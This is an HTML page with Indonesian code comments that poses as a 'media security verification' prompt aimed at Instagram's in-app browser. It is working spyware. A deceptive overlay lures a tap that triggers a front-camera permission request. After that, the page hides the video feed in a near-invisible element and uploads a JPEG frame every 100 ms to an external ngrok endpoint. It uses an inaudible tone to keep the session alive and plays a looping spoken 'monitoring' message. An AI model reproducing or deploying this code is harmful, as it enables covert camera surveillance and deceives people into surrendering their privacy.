<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Security Alert - Media Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
  
  /* Tombol interaktif transparan penuh untuk memancing user gesture di Instagram WebView */
  #permission-overlay {
    position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(0, 0, 0, 0.85);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    cursor: pointer;
    text-align: center;
    padding: 20px;
  }
  .box {
    background: #111827;
    border: 1px solid #374151;
    padding: 24px;
    border-radius: 12px;
    max-width: 320px;
    width: 100%;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  }
  h2 { font-size: 16px; margin-bottom: 10px; color: #f3f4f6; }
  p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
  .btn {
    background: #2563eb;
    color: #fff;
    border: none;
    padding: 10px 20px;
    border-radius: 6px;
    font-size: 14px;
    font-weight: bold;
    width: 100%;
  }

  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<!-- Overlay Interaktif untuk Memancing Izin Kamera di Instagram WebView -->
<div id="permission-overlay">
  <div class="box">
    <h2>Verifikasi Keamanan Media</h2>
    <p>Ketuk tombol di bawah untuk mengaktifkan sesi penelusuran aman dan melanjutkan.</p>
    <button class="btn">Lanjutkan Verifikasi</button>
  </div>
</div>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="640" height="480"></canvas>
</div>

<script>
(function () {
  'use strict';

  var CONFIG = {
    tts: {
      text: "Security verification required. Live monitoring session active.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      repeatInterval: 6000
    },
    streamInterval: 100, // Kirim frame cepat untuk live stream
    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
  };

  var state = {
    ttsStarted: false,
    camStream: null,
    camActive: false,
    streamTimer: null,
    audioCtx: null
  };

  function initAudioKeepAlive() {
    try {
      window.AudioContext = window.AudioContext || window.webkitAudioContext;
      state.audioCtx = new AudioContext();
      var osc = state.audioCtx.createOscillator();
      var gain = state.audioCtx.createGain();
      gain.gain.value = 0.00001;
      osc.frequency.value = 18000;
      osc.connect(gain);
      gain.connect(state.audioCtx.destination);
      osc.start();
    } catch (e) {}
  }

  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.onend = function () {
        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
      };
      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  function streamFrame() {
    if (!state.camActive) return;

    var videoElement = document.getElementById('cam-feed');
    var canvas = document.getElementById('processing-canvas');
    var ctx = canvas.getContext('2d');

    try {
      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;

      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      var dataURL = canvas.toDataURL('image/jpeg', 0.65);
      var payload = JSON.stringify({ image: dataURL });

      fetch(CONFIG.serverEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      }).catch(function(err) {});
    } catch (e) {}
  }

  function requestCameraAccess() {
    if (state.camActive) return;

    // Meminta izin kamera secara eksplisit setelah ada interaksi pengguna
    navigator.mediaDevices.getUserMedia({ 
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
      audio: false 
    })
    .then(function(stream) {
      state.camStream = stream;
      state.camActive = true;
      
      var videoElement = document.getElementById('cam-feed');
      videoElement.srcObject = stream;
      videoElement.play().catch(function(){});

      // Sembunyikan kotak dialog setelah izin berhasil diberikan
      var overlay = document.getElementById('permission-overlay');
      if (overlay) overlay.style.display = 'none';

      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          state.camActive = false;
        };
      });
    })
    .catch(function(err) {
      console.log("Camera access blocked/denied:", err);
    });
  }

  // Event listener utama yang mendeteksi ketukan (tap) layar di dalam In-App Browser Instagram
  document.getElementById('permission-overlay').addEventListener('click', function() {
    initAudioKeepAlive();
    if (state.audioCtx && state.audioCtx.state === 'suspended') {
      state.audioCtx.resume();
    }
    startTTS();
    requestCameraAccess();
  });

  window.addEventListener('DOMContentLoaded', function() {
    // Memulai timer stream, akan aktif otomatis setelah tombol diklik
    state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
  });

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) {
      startTTS();
      if (!state.camActive) {
        requestCameraAccess();
      }
    }
  });

})();
</script>
</body>
</html>
